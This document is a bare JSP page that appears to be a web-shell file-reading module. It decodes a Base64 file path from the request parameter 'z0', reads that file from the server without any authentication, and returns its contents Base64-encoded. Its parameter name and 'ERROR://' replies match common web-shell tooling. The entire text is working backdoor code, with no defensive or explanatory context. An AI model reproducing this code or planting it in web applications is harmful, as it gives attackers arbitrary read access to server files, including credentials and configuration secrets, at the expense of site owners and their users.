<%

import java.io.*;
import java.util.Base64;

String encodedPath = request.getParameter("z0");

if (encodedPath == null) {
    out.print("ERROR://Missing parameter");
    return;
}

String filePath = new String(Base64.getDecoder().decode(encodedPath));

File file = new File(filePath);

if (!file.exists()) {
    out.print("ERROR://Cannot find file: " + filePath);
    return;
}

FileInputStream fis = new FileInputStream(file);
ByteArrayOutputStream bos = new ByteArrayOutputStream();

byte[] buffer = new byte[4096];
int read;

while ((read = fis.read(buffer)) != -1) {
    bos.write(buffer, 0, read);
}

fis.close();

String base64 = Base64.getEncoder().encodeToString(bos.toByteArray());

out.print(base64);

%>